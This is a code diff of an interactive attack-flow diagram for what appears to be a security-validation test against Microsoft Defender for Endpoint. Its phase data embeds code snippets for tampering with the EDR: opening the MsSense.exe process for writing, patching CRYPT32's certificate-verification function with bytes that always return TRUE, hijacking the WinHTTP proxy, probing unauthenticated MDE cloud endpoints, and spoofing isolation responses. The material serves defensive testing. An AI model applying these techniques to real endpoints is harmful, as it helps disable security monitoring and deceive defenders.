-                    <text x="700" y="50" text-anchor="middle" fill="#ff6b6b" font-size="16" font-weight="bold">MDE Attack Flow</text>
-                    <text x="700" y="68" text-anchor="middle" fill="#9ca3af" font-size="11">11 Attack Phases - Click for Details</text>
+                    <!-- Arrows from Row 1 to Row 2 -->
+                    <path d="M 530 215 L 530 240 L 130 240 L 130 260" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
 
-                    <!-- Detection Legend -->
-                    <g transform="translate(50, 50)">
-                        <rect x="0" y="0" width="180" height="100" rx="6" fill="rgba(0,0,0,0.5)" stroke="rgba(255,107,107,0.3)"/>
-                        <text x="10" y="20" fill="#ffffff" font-size="12" font-weight="bold">Detection Points:</text>
-                        <circle cx="20" cy="40" r="5" fill="#ff4444"/>
-                        <text x="35" y="45" fill="#9ca3af" font-size="10">Critical Phase</text>
-                        <circle cx="20" cy="60" r="5" fill="#ff9f43"/>
-                        <text x="35" y="65" fill="#9ca3af" font-size="10">High Priority</text>
-                        <circle cx="20" cy="80" r="5" fill="#4fc3f7"/>
-                        <text x="35" y="85" fill="#9ca3af" font-size="10">Network/API</text>
+                    <!-- Flow Arrows - Row 2 -->
+                    <path d="M 210 302 L 250 302" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 410 302 L 450 302" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+
+                    <!-- Arrows from Row 2 to Row 3 -->
+                    <path d="M 530 345 L 530 370 L 130 370 L 130 390" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+
+                    <!-- Flow Arrows - Row 3 -->
+                    <path d="M 210 432 L 250 432" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+
+                    <!-- Arrows from Row 3 to Row 4 -->
+                    <path d="M 330 475 L 330 500 L 130 500 L 130 520" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+
+                    <!-- Flow Arrows - Row 4 -->
+                    <path d="M 210 562 L 250 562" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 410 562 L 450 562" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+
+                    <!-- Attack Path Summary (right side) -->
+                    <g transform="translate(680, 130)">
+                        <rect class="legend-box" x="0" y="0" width="270" height="475" rx="8"/>
+                        <text x="135" y="25" text-anchor="middle" font-size="14" font-weight="bold">Attack Path Summary</text>
+
+                        <!-- Process Injection Branch -->
+                        <text x="20" y="55" font-size="12" font-weight="bold" fill="#ff6b6b">Process Injection Path</text>
+                        <text class="svg-text-secondary" x="20" y="75" font-size="10">1. Validate environment + admin</text>
+                        <text class="svg-text-secondary" x="20" y="90" font-size="10">2. Enumerate MsSense.exe process</text>
+                        <text class="svg-text-secondary" x="20" y="105" font-size="10">3. Acquire privileged handles</text>
+                        <text class="svg-text-secondary" x="20" y="120" font-size="10">4. Enumerate CRYPT32.dll modules</text>
+                        <text class="svg-text-secondary" x="20" y="135" font-size="10">5. Patch cert validation function</text>
+
+                        <!-- API Authentication Branch -->
+                        <text x="20" y="170" font-size="12" font-weight="bold" fill="#4fc3f7">API Authentication Path</text>
+                        <text class="svg-text-secondary" x="20" y="190" font-size="10">6. Configure network proxy</text>
+                        <text class="svg-text-secondary" x="20" y="205" font-size="10">7. Race for CnC commands</text>
+                        <text class="svg-text-secondary" x="20" y="220" font-size="10">8. Generate CloudLR tokens</text>
+                        <text class="svg-text-secondary" x="20" y="235" font-size="10">9. Spoof isolation responses</text>
+                        <text class="svg-text-secondary" x="20" y="250" font-size="10">10. Exfiltrate 8MB config</text>
+
+                        <!-- Exit Codes -->
+                        <text x="20" y="285" font-size="12" font-weight="bold" fill="#ffc107">Exit Code Logic</text>
+                        <rect x="20" y="295" width="15" height="15" fill="#66bb6a" rx="2"/>
+                        <text class="svg-text-secondary" x="45" y="306" font-size="10">126 - Protected (injection blocked)</text>
+                        <rect x="20" y="315" width="15" height="15" fill="#ff9f43" rx="2"/>
+                        <text class="svg-text-secondary" x="45" y="326" font-size="10">126 - Partial (patch blocked)</text>
+                        <rect x="20" y="335" width="15" height="15" fill="#ff4444" rx="2"/>
+                        <text class="svg-text-secondary" x="45" y="346" font-size="10">101 - Vulnerable (access granted)</text>
+
+                        <!-- MITRE ATT&CK -->
+                        <text x="20" y="380" font-size="12" font-weight="bold" fill="#9c27b0">Primary TTPs</text>
+                        <text class="svg-text-secondary" x="20" y="400" font-size="10">T1055 - Process Injection</text>
+                        <text class="svg-text-secondary" x="20" y="415" font-size="10">T1055.001 - DLL Injection</text>
+                        <text class="svg-text-secondary" x="20" y="430" font-size="10">T1562.001 - Disable Tools</text>
+                        <text class="svg-text-secondary" x="20" y="445" font-size="10">T1014 - Rootkit</text>
+                        <text class="svg-text-secondary" x="20" y="460" font-size="10">T1557 - AiTM</text>
+                    </g>
+
+                    <!-- Execution Timeline -->
+                    <g class="svg-timeline">
+                        <text x="130" y="640" font-size="10" text-anchor="middle">T+0s</text>
+                        <text x="330" y="640" font-size="10" text-anchor="middle">T+5s</text>
+                        <text x="530" y="640" font-size="10" text-anchor="middle">T+12s</text>
+                        <text x="730" y="640" font-size="10" text-anchor="middle">T+50s</text>
+                        <text x="930" y="640" font-size="10" text-anchor="middle">T+120s</text>
                     </g>
 
                     <!-- Progress Bar -->
-                    <rect x="50" y="820" width="1300" height="4" rx="2" fill="rgba(255,255,255,0.1)"/>
-                    <rect x="50" y="820" width="0" height="4" rx="2" fill="#ff6b6b" id="progressBar"/>
+                    <rect class="progress-track" x="50" y="660" width="900" height="4" rx="2"/>
+                    <rect x="50" y="660" width="0" height="4" rx="2" fill="#ff6b6b" id="progressBar"/>
                 </svg>
 
                 <div class="stats-overlay">
@@ -709,8 +925,8 @@
                 </div>
 
                 <div class="nav-hint">
-                    <span class="nav-hint-icon">💡</span>
-                    <span>Click any phase to view detailed attack information • Use arrow keys to navigate</span>
+                    <span class="nav-hint-icon">i</span>
+                    <span>Click any phase to view detailed attack information</span>
                 </div>
             </div>
 
@@ -722,15 +938,20 @@
 
         <!-- Right Panel - Details (OPAQUE) -->
         <div class="details-panel" id="detailsPanel">
-            <button class="close-details" onclick="closeDetails()">×</button>
+            <button class="close-details" onclick="closeDetails()">x</button>
             <div id="detailsContent">
                 <!-- Details will be populated dynamically -->
             </div>
         </div>
+
+        <!-- Sidebar Toggle Button -->
+        <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" title="Toggle details panel">
+            <span class="toggle-icon">&lt;</span>
+        </button>
     </div>
 
     <script>
-        // Phase data with detailed information
+        // Phase data with MITRE links - all content is static/hardcoded (safe for innerHTML)
         const phaseData = {
             1: {
                 number: 1,
@@ -772,7 +993,7 @@
                         ]
                     }
                 ],
-                code: `// Environment Validation\nif !isAdministrator() {\n    SaveLog(Endpoint.UnexpectedTestError, "Admin required")\n    Endpoint.Stop(999)\n}\n\n// Extract embedded components\nos.WriteFile("C:\\\\F0\\\\watchdog.exe", watchdogBinary, 0755)`
+                code: "// Environment Validation\nif !isAdministrator() {\n    SaveLog(Endpoint.UnexpectedTestError, \"Admin required\")\n    Endpoint.Stop(999)\n}\n\n// Extract embedded components\nos.WriteFile(\"C:\\\\F0\\\\watchdog.exe\", watchdogBinary, 0755)"
             },
             2: {
                 number: 2,
@@ -814,7 +1035,7 @@
                         ]
                     }
                 ],
-                code: `// Process Discovery\nsnapshot := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)\nfor process in processes {\n    if process.Name == "MsSense.exe" {\n        // Found MDE agent - extract details\n        extractProcessDetails(pid)\n    }\n}`
+                code: "// Process Discovery\nsnapshot := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)\nfor process in processes {\n    if process.Name == \"MsSense.exe\" {\n        // Found MDE agent\n        extractProcessDetails(pid)\n    }\n}"
             },
             3: {
                 number: 3,
@@ -864,7 +1085,7 @@
                         ]
                     }
                 ],
-                code: `// CRITICAL: Handle acquisition attempt\nhandle, err := windows.OpenProcess(\n    PROCESS_VM_WRITE | PROCESS_VM_OPERATION,\n    false, mssensPID)\n\nif err != nil {\n    // PROTECTED: Access denied\n    injectionBlocked = true\n} else {\n    // VULNERABLE: Write access granted!\n    injectionBlocked = false\n}`
+                code: "// CRITICAL: Handle acquisition attempt\nhandle, err := windows.OpenProcess(\n    PROCESS_VM_WRITE | PROCESS_VM_OPERATION,\n    false, mssensePID)\n\nif err != nil {\n    // PROTECTED: Access denied\n    injectionBlocked = true\n} else {\n    // VULNERABLE: Write access granted!\n}"
             },
             4: {
                 number: 4,
@@ -906,7 +1127,7 @@
                         ]
                     }
                 ],
-                code: `// Memory enumeration\nmodules := EnumerateProcessModules(handle, pid)\ncrypt32 := FindModuleByName(modules, "CRYPT32.dll")\n\n// Resolve function address\nfuncAddr := crypt32.BaseAddress + GetExportOffset(\n    "CertVerifyCertificateChainPolicy")\n\n// Read original bytes\noriginalBytes := ReadProcessMemory(handle, funcAddr, 20)`
+                code: "// Memory enumeration\nmodules := EnumerateProcessModules(handle, pid)\ncrypt32 := FindModuleByName(modules, \"CRYPT32.dll\")\n\n// Resolve function address\nfuncAddr := crypt32.BaseAddress + GetExportOffset(\n    \"CertVerifyCertificateChainPolicy\")"
             },
             5: {
                 number: 5,
@@ -948,7 +1169,7 @@
                         ]
                     }
                 ],
-                code: `// Prepare certificate bypass patch\npatchBytes := []byte{0x33, 0xC0, 0x40, 0xC3}\n// xor eax,eax; inc eax; ret - always return TRUE\n\n// Attempt memory write\nerr := WriteProcessMemory(handle, funcAddr, patchBytes)\n\nif err != nil {\n    patchBlocked = true // PROTECTED\n} else {\n    patchBlocked = false // VULNERABLE\n    // Set 30s auto-rollback timer\n    defer restoreOriginalBytes()\n}`
+                code: "// Prepare certificate bypass patch\npatchBytes := []byte{0x33, 0xC0, 0x40, 0xC3}\n// xor eax,eax; inc eax; ret - always return TRUE\n\n// Attempt memory write\nerr := WriteProcessMemory(handle, funcAddr, patchBytes)\n\nif err != nil {\n    patchBlocked = true // PROTECTED\n}"
             },
             6: {
                 number: 6,
@@ -990,7 +1211,7 @@
                         ]
                     }
                 ],
-                code: `// Configure system proxy\ncmd := exec.Command("netsh", "winhttp", "set", "proxy",\n    "127.0.0.1:8080")\ncmd.Run()\n\n// Test if MDE traffic intercepted\n// (Certificate pinning should prevent this)\n\n// Restore original config\nexec.Command("netsh", "winhttp", "reset", "proxy").Run()`
+                code: "// Configure system proxy\ncmd := exec.Command(\"netsh\", \"winhttp\", \"set\", \"proxy\",\n    \"127.0.0.1:8080\")\ncmd.Run()\n\n// Restore original config\nexec.Command(\"netsh\", \"winhttp\", \"reset\", \"proxy\").Run()"
             },
             7: {
                 number: 7,
@@ -1032,7 +1253,7 @@
                         ]
                     }
                 ],
-                code: `// API Race Condition\ngo func() {\n    for i := 0; i < requestsPerSecond; i++ {\n        endpoint := fmt.Sprintf(\n            "https://winatp-gw-eus.microsoft.com/edr/commands/cnc?MachineID=%s",\n            machineID)\n        \n        // NO AUTHENTICATION TOKEN\n        req, _ := http.NewRequest("GET", endpoint, nil)\n        resp, _ := client.Do(req)\n        \n        if resp.StatusCode == 200 {\n            // VULNERABLE: Command stolen!\n            parseCommand(resp.Body)\n        }\n    }\n}()`
+                code: "// API Race Condition\ngo func() {\n    endpoint := \"https://winatp-gw.microsoft.com/edr/commands/cnc\"\n    req, _ := http.NewRequest(\"GET\", endpoint, nil)\n    req.Header.Set(\"X-MachineId\", machineID)\n    // NO AUTHENTICATION TOKEN\n    resp, _ := client.Do(req)\n}()"
             },
             8: {
                 number: 8,
@@ -1074,7 +1295,7 @@
                         ]
                     }
                 ],
-                code: `// CloudLR token generation attempt\nendpoint := "https://winatp-gw-eus.microsoft.com/senseir/v1/actions/"\nreq, _ := http.NewRequest("POST", endpoint, requestBody)\n\n// NO AUTHENTICATION\nresp, _ := client.Do(req)\n\nif resp.StatusCode == 200 {\n    // VULNERABLE: Token granted!\n    token := parseToken(resp.Body)\n    // Can now execute commands remotely\n}`
+                code: "// CloudLR token generation attempt\nendpoint := \"https://winatp-gw.microsoft.com/senseir/v1/actions/\"\nreq, _ := http.NewRequest(\"GET\", endpoint, nil)\nreq.Header.Set(\"X-MachineId\", identifiers.MachineID)\n// NO AUTHENTICATION\nresp, _ := client.Do(req)"
             },
             9: {
                 number: 9,
@@ -1116,7 +1337,7 @@
                         ]
                     }
                 ],
-                code: `// Spoof isolation response\nif interceptedCommand.Type == "isolationcommand" {\n    fakeStatus := {\n        "status": "completed",\n        "message": "Device successfully isolated",\n        "timestamp": time.Now()\n    }\n    \n    // Send to status endpoint\n    http.Post(statusEndpoint, fakeStatus)\n    \n    // Device still has full connectivity!\n}`
+                code: "// Spoof isolation response\npayload := map[string]interface{}{\n    \"commandId\": commandID,\n    \"status\":    \"AlreadyIsolated\",\n    \"message\":   \"Device is already isolated\",\n}\nhttp.Post(statusEndpoint, payload)"
             },
             10: {
                 number: 10,
@@ -1145,8 +1366,7 @@
                             "Detection rule patterns (RULE_POWERSHELL_*)",
                             "File/process exclusion lists",
                             "Monitored behaviors and thresholds",
-                            "Certificate pins and cloud endpoints",
-                            "Network infrastructure topology"
+                            "Certificate pins and cloud endpoints"
                         ]
                     },
                     {
@@ -1157,18 +1377,9 @@
                             "Craft attacks to evade specific rules",
                             "Plan infrastructure based on topology"
                         ]
-                    },
-                    {
-                        title: "Detection Expectation",
-                        details: [
-                            "PROTECTED: 403 Forbidden response",
-                            "PROTECTED: Strong authentication required",
-                            "VULNERABLE: Full config downloaded",
-                            "Success = complete security blueprint disclosed"
-                        ]
                     }
                 ],
-                code: `// Configuration exfiltration\nconfigURL := fmt.Sprintf(\n    "https://winatp-gw-eus.microsoft.com/edr/config?MachineID=%s",\n    machineID)\n\nresp, _ := http.Get(configURL)\n\nif resp.StatusCode == 200 {\n    // VULNERABLE: 8MB config downloaded\n    config, _ := ioutil.ReadAll(resp.Body)\n    ioutil.WriteFile("C:\\\\F0\\\\exfiltrated_config.json", config, 0644)\n    \n    // Attacker now has full security policy\n}`
+                code: "// Configuration exfiltration\nconfigURL := fmt.Sprintf(\n    \"https://winatp-gw.microsoft.com/edr/config?MachineID=%s\",\n    machineID)\nresp, _ := http.Get(configURL)\n// Attacker now has full security policy"
             },
             11: {
                 number: 11,
@@ -1205,9 +1416,7 @@
                             "Save test_execution_log.json (machine-parseable)",
                             "Save test_execution_log.txt (human-readable)",
                             "Save process_injection_report.json",
-                            "Save memory_patch_report.json",
-                            "Save api_interception_report.json",
-                            "Generate attack_summary.txt"
+                            "Save memory_patch_report.json"
                         ]
                     },
                     {
@@ -1216,50 +1425,75 @@
                             "Verify watchdog restored all patches",
                             "Close all process handles",
                             "Wait 10s for delayed EDR detection",
-                            "Check if any files quarantined",
                             "Exit with appropriate code"
                         ]
                     }
                 ],
-                code: `// Final evaluation logic\nvar finalExitCode int\n\nif injectionReport.BlockedByEDR {\n    // PROTECTED: Handle acquisition denied\n    Endpoint.Say("✅ RESULT: PROTECTED")\n    Endpoint.Say("System prevented process injection")\n    finalExitCode = Endpoint.ExecutionPrevented\n} else if patchResult.Blocked {\n    // PARTIALLY PROTECTED: Injection OK but patch blocked\n    Endpoint.Say("⚠️  RESULT: PARTIALLY PROTECTED")\n    finalExitCode = Endpoint.ExecutionPrevented\n} else if writeResult.Success {\n    // VULNERABLE: Full access granted\n    Endpoint.Say("❌ RESULT: VULNERABLE")\n    Endpoint.Say("IMMEDIATE ACTION REQUIRED")\n    finalExitCode = Endpoint.Unprotected\n} else {\n    // Attack interrupted/blocked\n    finalExitCode = Endpoint.ExecutionPrevented\n}\n\nSaveLog(finalExitCode, "Final evaluation complete")\nEndpoint.Stop(finalExitCode)`
+                code: "// Final evaluation logic\nif injectionReport.BlockedByEDR {\n    Endpoint.Say(\"PROTECTED\")\n    finalExitCode = Endpoint.ExecutionPrevented\n} else if patchResult.Blocked {\n    Endpoint.Say(\"PARTIALLY PROTECTED\")\n    finalExitCode = Endpoint.ExecutionPrevented\n} else {\n    Endpoint.Say(\"VULNERABLE\")\n    finalExitCode = Endpoint.Unprotected\n}"
             }
         };
 
         // Current active phase
         let currentPhase = null;
 
+        // Sidebar toggle state
+        var sidebarCollapsed = false;
+        function toggleSidebar() {
+            var detailsPanel = document.getElementById('detailsPanel');
+            var toggleBtn = document.getElementById('sidebarToggle');
+
+            sidebarCollapsed = !sidebarCollapsed;
+
+            if (sidebarCollapsed) {
+                detailsPanel.classList.add('collapsed');
+                toggleBtn.classList.remove('expanded');
+                toggleBtn.classList.add('collapsed');
+            } else {
+                detailsPanel.classList.remove('collapsed');
+                if (detailsPanel.classList.contains('active')) {
+                    toggleBtn.classList.add('expanded');
+                }
+                toggleBtn.classList.remove('collapsed');
+            }
+        }
+
         // Function to create MITRE links
         function createMitreLinks(mitreArray) {
-            return mitreArray.map(technique => {
-                const baseUrl = "https://attack.mitre.org/techniques/";
-                const techId = technique.id.replace('.', '/');
-                return `<a href="${baseUrl}${techId}" target="_blank" class="mitre-link" title="${technique.name}">${technique.id}</a>`;
+            return mitreArray.map(function(technique) {
+                var baseUrl = "https://attack.mitre.org/techniques/";
+                var techId = technique.id.replace('.', '/');
+                return '<a href="' + baseUrl + techId + '" target="_blank" class="mitre-link" title="' + technique.name + '">' + technique.id + '</a>';
             }).join(', ');
+        }
+
+        // Escape HTML for safe display
+        function escapeHtml(text) {
+            var div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
         }
 
         // Initialize timeline view
         function initializeTimeline() {
-            const timelineView = document.getElementById('timelineView');
-            let html = '';
+            var timelineView = document.getElementById('timelineView');
+            var html = '';
 
-            for (let i = 1; i <= 11; i++) {
-                const phase = phaseData[i];
-                const severityColor = getSeverityColor(phase.severity);
-                const mitreText = phase.mitre.map(t => t.id).join(', ');
+            for (var i = 1; i <= 11; i++) {
+                var phase = phaseData[i];
+                var severityColor = getSeverityColor(phase.severity);
+                var mitreText = phase.mitre.map(function(t) { return t.id; }).join(', ');
 
-                html += `
-                    <div class="timeline-item" onclick="showPhaseDetails(${i})">
-                        <div class="timeline-number" style="border-color: ${severityColor}; color: ${severityColor};">
-                            ${i}
-                        </div>
-                        <div class="timeline-content">
-                            <div class="timeline-title">${phase.title}</div>
-                            <div class="timeline-meta">
-                                ${phase.time} • ${mitreText} • ${phase.severity.toUpperCase()}
-                            </div>
-                        </div>
-                    </div>
-                `;
+                html += '<div class="timeline-item" onclick="showPhaseDetails(' + i + ')">' +
+                    '<div class="timeline-number" style="border-color: ' + severityColor + '; color: ' + severityColor + ';">' +
+                    i +
+                    '</div>' +
+                    '<div class="timeline-content">' +
+                    '<div class="timeline-title">' + escapeHtml(phase.title) + '</div>' +
+                    '<div class="timeline-meta">' +
+                    escapeHtml(phase.time) + ' | ' + escapeHtml(mitreText) + ' | ' + (phase.status === 'actual' ? 'Actual' : 'Simulated') +
+                    '</div>' +
+                    '</div>' +
+                    '</div>';
             }
 
             timelineView.innerHTML = html;
@@ -1268,128 +1502,109 @@
         // Show phase details
         function showPhaseDetails(phaseNum) {
             currentPhase = phaseNum;
-            const phase = phaseData[phaseNum];
-            const detailsPanel = document.getElementById('detailsPanel');
-            const detailsContent = document.getElementById('detailsContent');
+            var phase = phaseData[phaseNum];
+            var detailsPanel = document.getElementById('detailsPanel');
+            var detailsContent = document.getElementById('detailsContent');
 
             // Update active states
-            document.querySelectorAll('.component').forEach(comp => {
+            document.querySelectorAll('.component').forEach(function(comp) {
                 comp.classList.remove('active');
             });
-            document.querySelectorAll('.timeline-item').forEach(item => {
+            document.querySelectorAll('.timeline-item').forEach(function(item) {
                 item.classList.remove('active');
             });
 
             // Add active state to clicked component
-            const activeComponent = document.querySelector(`.component[data-phase="${phaseNum}"]`);
+            var activeComponent = document.querySelector('.component[data-phase="' + phaseNum + '"]');
             if (activeComponent) {
                 activeComponent.classList.add('active');
             }
 
             // Add active state to timeline item
-            const timelineItems = document.querySelectorAll('.timeline-item');
+            var timelineItems = document.querySelectorAll('.timeline-item');
             if (timelineItems[phaseNum - 1]) {
                 timelineItems[phaseNum - 1].classList.add('active');
             }
 
             // Generate details HTML
-            const severityColor = getSeverityColor(phase.severity);
-            let actionsHtml = '';
+            var severityColor = getSeverityColor(phase.severity);
+            var actionsHtml = '';
 
-            phase.actions.forEach(action => {
-                let detailsHtml = action.details.map(detail => `<li>${detail}</li>`).join('');
-                actionsHtml += `
-                    <div class="action-item">
-                        <div class="action-title">${action.title}</div>
-                        <ul class="action-details">
-                            ${detailsHtml}
-                        </ul>
-                    </div>
-                `;
+            phase.actions.forEach(function(action) {
+                var detailsHtml = action.details.map(function(detail) {
+                    return '<li>' + escapeHtml(detail) + '</li>';
+                }).join('');
+                actionsHtml += '<div class="action-item">' +
+                    '<div class="action-title">' + escapeHtml(action.title) + '</div>' +
+                    '<ul class="action-details">' + detailsHtml + '</ul>' +
+                    '</div>';
             });
 
-            const mitreLinks = createMitreLinks(phase.mitre);
+            var mitreLinks = createMitreLinks(phase.mitre);
 
-            detailsContent.innerHTML = `
-                <div class="details-header">
-                    <div class="details-phase-number" style="border-color: ${severityColor}; color: ${severityColor};">
-                        ${phase.number}
-                    </div>
-                    <h2 class="details-title">${phase.title}</h2>
-                    <div class="severity-badge ${phase.severity}">${phase.severity.toUpperCase()}</div>
-                    <div class="details-meta">
-                        <div class="meta-item">
-                            <span class="meta-label">MITRE:</span>
-                            <span class="meta-value">${mitreLinks}</span>
-                        </div>
-                        <div class="meta-item">
-                            <span class="meta-label">Time:</span>
-                            <span class="meta-value">${phase.time}</span>
-                        </div>
-                        <div class="meta-item">
-                            <span class="meta-label">Status:</span>
-                            <span class="meta-value">${phase.status === 'actual' ? '✓ Actual execution' : '⚠️ Simulated'}</span>
-                        </div>
-                    </div>
-                </div>
+            var codeHtml = '';
+            if (phase.code) {
+                var codeLines = phase.code.split('\n').map(function(line) {
+                    if (line.indexOf('//') === 0) {
+                        return '<div class="code-line code-comment">' + escapeHtml(line) + '</div>';
+                    } else {
+                        return '<div class="code-line">' + escapeHtml(line) + '</div>';
+                    }
+                }).join('');
+                codeHtml = '<div class="details-section">' +
+                    '<h3 class="section-title"><span>Code Preview</span></h3>' +
+                    '<div class="code-preview">' + codeLines + '</div>' +
+                    '</div>';
+            }
 
-                <div class="details-section">
-                    <p style="color: #9ca3af; margin-bottom: 20px;">${phase.description}</p>
-                </div>
-
-                <div class="details-section">
-                    <h3 class="section-title">
-                        <span>🎯</span>
-                        <span>Actions Performed</span>
-                    </h3>
-                    <div class="action-list">
-                        ${actionsHtml}
-                    </div>
-                </div>
-
-                ${phase.code ? `
-                <div class="details-section">
-                    <h3 class="section-title">
-                        <span>💻</span>
-                        <span>Code Preview</span>
-                    </h3>
-                    <div class="code-preview">
-                        ${phase.code.split('\n').map(line => {
-                            if (line.startsWith('#') || line.startsWith('//')) {
-                                return `<div class="code-line code-comment">${line}</div>`;
-                            } else if (line.includes('=')) {
-                                return `<div class="code-line">${line.replace(/(\$\w+|"[^"]*"|\d+)/g, '<span class="code-highlight">$1</span>')}</div>`;
-                            } else {
-                                return `<div class="code-line">${line}</div>`;
-                            }
-                        }).join('')}
-                    </div>
-                </div>
-                ` : ''}
-            `;
+            detailsContent.innerHTML = '<div class="details-header">' +
+                '<div class="details-phase-number" style="border-color: ' + severityColor + '; color: ' + severityColor + ';">' +
+                phase.number +
+                '</div>' +
+                '<h2 class="details-title">' + escapeHtml(phase.title) + '</h2>' +
+                '<div class="severity-badge ' + phase.severity + '">' + phase.severity.toUpperCase() + '</div>' +
+                '<div class="details-meta">' +
+                '<div class="meta-item"><span class="meta-label">MITRE:</span><span class="meta-value">' + mitreLinks + '</span></div>' +
+                '<div class="meta-item"><span class="meta-label">Time:</span><span class="meta-value">' + escapeHtml(phase.time) + '</span></div>' +
+                '<div class="meta-item"><span class="meta-label">Status:</span><span class="meta-value">' + (phase.status === 'actual' ? 'Actual execution' : 'Simulated only') + '</span></div>' +
+                '</div>' +
+                '</div>' +
+                '<div class="details-section"><p style="color: var(--diagram-text-secondary); margin-bottom: 20px;">' + escapeHtml(phase.description) + '</p></div>' +
+                '<div class="details-section"><h3 class="section-title"><span>Actions Performed</span></h3><div class="action-list">' + actionsHtml + '</div></div>' +
+                codeHtml;
 
             // Show details panel
             detailsPanel.classList.add('active');
 
             // Update progress bar
             updateProgressBar(phaseNum);
+
+            // Position toggle button with sidebar
+            var toggleBtn = document.getElementById('sidebarToggle');
+            if (!sidebarCollapsed) {
+                toggleBtn.classList.add('expanded');
+            }
         }
 
         // Close details panel
         function closeDetails() {
             document.getElementById('detailsPanel').classList.remove('active');
-            document.querySelectorAll('.component').forEach(comp => {
+            document.querySelectorAll('.component').forEach(function(comp) {
                 comp.classList.remove('active');
             });
-            document.querySelectorAll('.timeline-item').forEach(item => {
+            document.querySelectorAll('.timeline-item').forEach(function(item) {
                 item.classList.remove('active');
             });
+
+            // Reset toggle button position
+            var toggleBtn = document.getElementById('sidebarToggle');
+            toggleBtn.classList.remove('expanded');
         }
 
         // Switch view
         function switchView(view) {
             // Update button states
-            document.querySelectorAll('.view-btn').forEach(btn => {
+            document.querySelectorAll('.view-btn').forEach(function(btn) {
                 btn.classList.remove('active');
             });
             event.target.classList.add('active');
@@ -1419,8 +1634,8 @@
 
         // Update progress bar
         function updateProgressBar(phaseNum) {
-            const progressBar = document.getElementById('progressBar');
-            const width = (phaseNum / 11) * 1300;
+            var progressBar = document.getElementById('progressBar');
+            var width = (phaseNum / 11) * 900;
             progressBar.style.width = width + 'px';
             progressBar.style.transition = 'width 0.5s ease';
         }
@@ -1429,10 +1644,11 @@
         document.addEventListener('DOMContentLoaded', function() {
             initializeTimeline();
 
-            // Show phase 1 details by default
-            setTimeout(() => {
+            // Sidebar starts expanded - show phase 1 details
+            sidebarCollapsed = false;
+            setTimeout(function() {
                 showPhaseDetails(1);
-            }, 1000);
+            }, 500);
         });
 
         // Keyboard navigation
@@ -1447,6 +1663,28 @@
                 }
             }
         });
+
+        // ═══════════════════════════════════════════════════════════════
+        // THEME SYNC - Listen for postMessage from parent window
+        // Supports integration with ProjectAchilles iframe embedding
+        // ═══════════════════════════════════════════════════════════════
+        window.addEventListener('message', function(event) {
+            // Handle theme change messages from parent
+            if (event.data && event.data.type === 'theme-change') {
+                var theme = event.data.theme;
+                if (theme === 'light' || theme === 'dark') {
+                    document.documentElement.setAttribute('data-theme', theme);
+                    // Also set class for compatibility
+                    document.documentElement.classList.remove('light', 'dark');
+                    document.documentElement.classList.add(theme);
+                }
+            }
+        });
+
+        // Notify parent that diagram is ready to receive theme
+        if (window.parent !== window) {
+            window.parent.postMessage({ type: 'diagram-ready' }, '*');
+        }
     </script>
 </body>
 </html>
